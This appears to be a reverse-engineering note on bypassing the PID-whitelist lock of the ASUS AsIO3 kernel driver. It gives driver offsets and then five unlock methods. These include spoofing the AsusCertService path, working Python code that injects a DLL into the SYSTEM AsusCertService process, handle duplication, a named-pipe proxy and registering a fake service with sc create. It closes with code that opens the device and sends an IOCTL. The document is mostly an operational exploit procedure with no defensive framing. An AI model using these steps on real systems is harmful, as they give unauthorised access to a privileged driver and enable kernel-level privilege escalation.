# AsIO3 AsusCertService Unlock Procedure

## Overview

The AsIO3 driver implements a PID-based access control mechanism that only allows whitelisted processes to use its IOCTL interface. The whitelist is managed through the AsusCertService integration.

## How the Lock Works

### Device Security Descriptor

The device object `\Device\Asusgio3` has a custom security descriptor that restricts CreateFile access. Even administrators get ACCESS_DENIED (error 5). The SD is set during DriverEntry via ZwSetSecurityObject (RVA 0xB49D).

### PID Whitelist

Even if a handle is obtained, a second check at RVA 0x14BC validates the calling process's PID:

```
PID Whitelist Structure:
- Static array: .data+0x00, 29 DWORD entries (116 bytes)
- Dynamic array: pointer at .data+0x5D0, count at [ptr+0x24]
- Process exit cleanup: .data+0x3C0, 64 QWORD entries
```

### Process Notification Callback

Registered via PsSetCreateProcessNotifyRoutineEx. Callback at RVA 0x3CD0:
- On process creation: checks if path matches AsusCertService, adds PID
- On process exit: scans whitelist arrays, removes matching PID

## The AsusCertService Path Check

The driver verifies new process paths against:
```
C:\Program Files (x86)\ASUS\AsusCertService
```
(Unicode string at file offset 0x7120, RVA 0x7F20)

The comparison uses the process image path from PsGetProcessImageFileName or the full path from ZwQueryInformationProcess (ProcessImageFileName).

## Unlock Procedures

### Method A: Path Spoofing (Simplest)

1. Create directory structure:
   ```cmd
   mkdir "C:\Program Files (x86)\ASUS\AsusCertService"
   ```
   (Already exists since AsusCertService is installed)

2. Copy or hardlink your executable INTO that directory:
   ```cmd
   copy saomola-tui.exe "C:\Program Files (x86)\ASUS\AsusCertService\saomola-tui.exe"
   ```

3. Run from that path:
   ```cmd
   "C:\Program Files (x86)\ASUS\AsusCertService\saomola-tui.exe" keys
   ```

4. The process creation notify callback will fire and add this PID to the whitelist.

5. The process can then open \\.\Asusgio3 and call IOCTLs.

**CAVEAT**: This depends on how strictly the driver validates the path. It may:
- Check full path prefix match (likely)
- Check executable signature (unlikely - no Authenticode APIs imported)
- Check parent-child process relationship (no evidence of this)

### Method B: DLL Injection into AsusCertService (Most Reliable)

1. AsusCertService.exe is running as PID 3760 (Session 0, SYSTEM)
2. It's NOT a Protected Process (no PPL)
3. Steps:
   ```python
   # From elevated Python:
   import ctypes
   
   # Open AsusCertService process
   PROCESS_ALL_ACCESS = 0x1F0FFF
   h_proc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, 3760)
   
   # Allocate memory for DLL path
   dll_path = r"C:\path\to\payload.dll"
   alloc = kernel32.VirtualAllocEx(h_proc, None, len(dll_path)+1, 0x3000, 0x40)
   
   # Write DLL path
   kernel32.WriteProcessMemory(h_proc, alloc, dll_path.encode(), len(dll_path)+1, None)
   
   # CreateRemoteThread with LoadLibraryA
   load_lib = kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
   kernel32.CreateRemoteThread(h_proc, None, 0, load_lib, alloc, 0, None)
   ```

4. Inside the DLL:
   ```c
   // DllMain runs in AsusCertService context (whitelisted PID)
   HANDLE h = CreateFileW(L"\\\\.\\Asusgio3", GENERIC_READ|GENERIC_WRITE, ...);
   // h is valid! Now duplicate to target process or use directly
   ```

### Method C: Handle Duplication from ASUS Process

1. Find which ASUS process already has an open handle to \\.\Asusgio3
2. Use NtDuplicateObject to copy the handle to our process
3. Use the duplicated handle for IOCTLs

```python
# Enumerate handles in AsusCertService (PID 3760) or AsusSystemAnalysis
# Look for handles to \Device\Asusgio3
# Use NtQuerySystemInformation(SystemHandleInformation) to find them
```

### Method D: Named Pipe Proxy

1. Inject into AsusCertService
2. Create a named pipe server in the injected DLL
3. Our process connects to the pipe
4. Forwards IOCTL requests through the whitelisted process

### Method E: Service Registration

1. Register our own service with a path under the ASUS directory:
   ```cmd
   sc create FakeAsus binPath= "C:\Program Files (x86)\ASUS\AsusCertService\our_svc.exe"
   sc start FakeAsus
   ```

2. When the service starts, the driver's process notify callback sees the path match and whitelists the PID.

## Verification Steps

After attempting unlock:

```python
import ctypes
import ctypes.wintypes as wintypes

kernel32 = ctypes.windll.kernel32
kernel32.CreateFileW.restype = wintypes.HANDLE

h = kernel32.CreateFileW(
    r"\\.\Asusgio3",
    0x80000000 | 0x40000000,  # GENERIC_READ | GENERIC_WRITE
    3,  # FILE_SHARE_READ | FILE_SHARE_WRITE
    None, 3, 0, None  # OPEN_EXISTING
)
error = kernel32.GetLastError()

if error == 0:
    print("SUCCESS: Device opened")
    # Test with a safe IOCTL (port read of POST code port 0x80)
    buf = (ctypes.c_byte * 8)()
    buf[0] = 0x80  # port number
    br = wintypes.DWORD(0)
    r = kernel32.DeviceIoControl(h, 0xA0400F58, buf, 8, buf, 8, ctypes.byref(br), None)
    if r:
        print(f"IOCTL works! Port 0x80 = {buf[0]:#x}")
    else:
        print(f"IOCTL failed: error {kernel32.GetLastError()}")
    kernel32.CloseHandle(h)
elif error == 5:
    print("FAILED: Still ACCESS_DENIED (PID not whitelisted)")
elif error == 2:
    print("FAILED: FILE_NOT_FOUND (device doesn't exist)")
```

## Security Descriptor Details

The device SD is constructed in the function at RVA 0xB290-0xB403:
1. Calls IoCreateDevice with device type 0xA040
2. Sets device flags (DO_BUFFERED_IO implied by METHOD_BUFFERED)
3. Creates a security descriptor with RtlCreateSecurityDescriptor
4. Adds ACEs via RtlAddAccessAllowedAce
5. The allowed SIDs likely include: S-1-5-18 (SYSTEM) and specific ASUS service SIDs
6. Applies SD to device via ZwSetSecurityObject

## Important Notes

1. The driver does NOT check Authenticode signatures of the calling process
2. The driver does NOT verify parent-child process chains
3. The path check is the ONLY validation for whitelist enrollment
4. Once a PID is whitelisted, it stays whitelisted until the process exits
5. The whitelist survives across device open/close cycles
6. Maximum 29 static entries + dynamic entries (limited by allocated buffer)
